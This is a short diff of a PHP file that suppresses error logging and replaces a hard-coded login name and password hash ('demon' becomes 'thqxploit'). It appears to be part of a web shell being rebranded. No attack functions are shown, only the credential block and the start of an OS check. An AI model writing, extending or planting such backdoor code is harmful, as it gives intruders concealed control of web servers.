@@ -4,8 +4,8 @@
 @error_reporting(0);
 @error_log(false);
 @session_start();
-define("username", "demon");
-define("passwd", "9796f7941dd0e4effbf204b44adf491b");
+define("username", "thqxploit");
+define("passwd", "03cb2f33ec5822382ade49ff71b8bd50");
 
 
 if (strtolower(substr(PHP_OS, 0, 3)) === "win") {
